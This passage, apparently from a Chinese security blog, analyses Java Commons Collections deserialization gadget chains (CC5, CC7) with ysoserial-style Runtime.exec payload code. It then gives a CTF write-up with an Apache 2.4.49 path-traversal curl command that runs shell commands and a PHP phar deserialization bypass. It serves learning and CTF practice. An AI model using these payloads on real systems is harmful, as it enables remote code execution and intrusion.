class="keyword">new</span> ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>javassist</code> 生成payload，而templates为<code>TemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">                    command,</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里利用到了一个新的类<code>LinkedHashSet</code> ，不过只是<code>HashSet</code>的子类，用于调用<code>HashSet#readObject</code></p>
<p>利用反射获取构造方法实例化<code>AnnotationInvocationHandler</code> ，并给属性type赋值</p>
<p>利用动态代理的方法实现Templates 接口，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br></pre></td></tr></table></figure>

<p>HashMap修改值，是为了防止在序列化的时候触发，因为序列化的时候会调用到<code>HashSet#add</code> 从而调用到<code>Hash#put</code> ，其中会调用到<code>Templates#equals</code>因为使用了动态代理所以会调用到<code>AnnotationInvocationHandler#invoke</code> 从而调用到<code>equalsImpl</code>，</p>
<p><img src="https://img-blog.csdnimg.cn/b20306fa7dec43f4a2954af995590ff7.png" alt="Untitled"></p>
<p>而在<code>equalsImpl</code> 中会遍历类里面的所有方法然后直接调用</p>
<p>调用到<code>TemplatesImpl#getOutputProperties</code> 从而实现了RCE，而这个也是反序列化之后实现RCE的主要调用链</p>
<p><img src="https://img-blog.csdnimg.cn/22c2f29e90bd43a1a6fc7ecbb131e8a3.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">map.put(zeroHashCodeStr, templates);</span><br></pre></td></tr></table></figure>

<p>而反序列化之后利用链的起点在于</p>
<p><img src="https://img-blog.csdnimg.cn/7c5f4542f89149cabc7def638c3bb677.png" alt="Untitled"></p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK 8u76</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This only works in JDK 8u76 and WITHOUT a security manager</p>
</blockquote>
<h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">BadAttributeValueExpException</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">      <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">              <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">      <span class="comment">// real chain for after setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">      Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">      valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections5.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isBadAttrValExcReadObj();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>相较于CC6，CC5利用到了<code>BadAttributeValueExpException</code> 异常类，去看一下这个类只有一个构造方法和一个<code>toString</code> | <code>readObject</code></p>
<p>而exp中将给该类的val赋值为放入了修饰好的恶意类的<code>TiedMapEntry</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">      Reflections.setAccessible(valfield);</span><br><span class="line">valfield.set(val, entry);</span><br></pre></td></tr></table></figure>

<p>那么关键就是反序列化的时候会怎么调用，因为exp是对<code>val</code> 进行序列化，说明会调用到<code>BadAttributeValueExpException</code> 的<code>readObject</code></p>
<p>代码执行的时候会实现获取<code>BadAttributeValueExpException</code> 的所有属性，而valObj则获取了val的值，也就是<code>TiedMapEntry</code> ，导致在后面调用到了<code>valObj.toString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>TiedMapEntry#toString</code> 会调用到<code>getValue</code>，其中实现对<code>LazyMap#get</code>的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line">LazyMap#get` ，这里的`<span class="keyword">this</span>.factory` 其实就是`<span class="function">ChainedTransformer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer#transform</code> 实现payload中<code>InvokerTransformer#transform</code> 的调用，从而实现RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>jdk8u71</p>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Hashtable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;command&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections7.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>CC7的链子特点在于定义了两个<code>LazyMap</code> ，并放到<code>Hashtable</code> 中去，而<code>Hashtable</code> 顾名思义也就是哈希表，</p>
<p>这个链子显而易见也是像通过调用到<code>LazyMap#get</code> 或者<code>LazyMap#getValue</code> 来实现RCE，那么重点就是从哪里开始调用了，这里套在最外面的类为<code>Hashtable</code> ，那就直接去看<code>Hashtable#readObject</code></p>
<p>会遍历<code>Hashtable</code> 里面的键值对</p>
<p><img src="https://img-blog.csdnimg.cn/be18ff732469477c8174b92f1f96fc47.png" alt="Untitled"></p>
<p>跟进到<code>reconstitutionPut</code> ，这里会将遍历到的键值对都放到<code>tab</code>里面，并且要保证放入的数据<code>hashCode</code>不能相等即不能产生哈希碰撞，而如果<code>hashCode</code>相等就会调用到<code>LazyMap#equals</code></p>
<p><img src="https://img-blog.csdnimg.cn/e4f6cd039ca146b2882774bc3c3e39b0.png" alt="Untitled"></p>
<p>跟进到<code>LazyMap#equals</code> ，但LazyMap并没有重写这个方法，那就是他父类<code>AbstractMapDecorator#equals</code></p>
<p>这里再次调用到了某类的equals，而链子里在实现LazyMap的时候会先写一个innerMap（HashMap），而<code>LazyMap#decorate</code> 方法也就相当于构造方法，将innerMap给了父类，所有这里的<code>this.map</code> 也就是<code>HashMap</code>了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> object == <span class="keyword">this</span> ? <span class="keyword">true</span> : <span class="keyword">this</span>.map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是HashMap也没有重写这个方法，照例去其父类找<code>AbstractMap#equals</code></p>
<p>成功调用到了<code>LazyMap#get</code> ，后面的就不继续分析了</p>
<p><img src="https://img-blog.csdnimg.cn/f9d53566d19246eaaaec753f9c45eb39.png" alt="Untitled"></p>
<p>所有理所当然的，要实现这个链子，就需要强制调用到<code>AbstractMapDecorator#equals</code> ，也就是说传入HashTable必须要产生哈希碰撞，而这个点在之前蓝帽杯的时候也碰到了，这里就不明确说了</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/at52wg">https://www.yuque.com/jinjinshigekeaigui/qskpi5/at52wg</a></p>
<p><a href="https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java">https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Round#4 Team Web</title>
    <url>/2022/08/03/NSSCTF-Round-4-Team-Web/</url>
    <content><![CDATA[<h2 id="1zweb"><a href="#1zweb" class="headerlink" title="1zweb"></a>1zweb</h2><p>非预期，直接读flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/flag</span><br></pre></td></tr></table></figure>

<h2 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h2><p>经典Apache2.4.49 路径穿越漏洞</p>
<p>直接上payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X  POST -d &quot;echo;ls /flag_is_here;grep -r &quot;NSS&quot; /flag_is_here&quot; &lt;http://1.116.210.145:28122/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1zweb-revenge"><a href="#1zweb-revenge" class="headerlink" title="1zweb(revenge)"></a>1zweb(revenge)</h2><ul>
<li>经典phar+gzip+php引用绕过__wakeup</li>
</ul>
<p>直接用php伪协议读取源码：<code>index.php | upload.php</code></p>
<p><code>index.php</code> ，存在一个类可以进行RCE，并且可以进行任意文件读取，不过这里把flag过滤了，但是既然存在对文件的操作，自然而然就是phar协议进行反序列化咯</p>
<p>但是注意这里的类存在<code>__wakeup</code> ，虽然该环境的php版本符合某个cve，但是phar文件内容不可以随便更改，所有就不能利用了，所以要用php引用绕过。在wakeup中可以发现我们需要的值进行了互换，那么如果<code>LoveNss2</code>的<code>ljt</code>引用<code>LoveNss1</code>的<code>dky</code> ，而在<code>LoveNss1</code> 的<code>__wakeup</code>最后才会执行实现了<code>LoveNss2-&gt;ljt = Misc</code> ，实现<code>LoveNss2#destruct</code> 中的rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在<code>upload.php</code> 中做了一些过滤，可以看到对后缀名进行了白名单，不过phar并不介意这个。但是在后面会根据判断文件内容中是否存在<code>__HALT_COMPILER();</code> ，直接不能直接利用phar文件改后缀名绕过了，不过可以利用gzip绕过，phar也是可以解析的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(gettype(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = fopen(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                fclose(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>poc：</p>
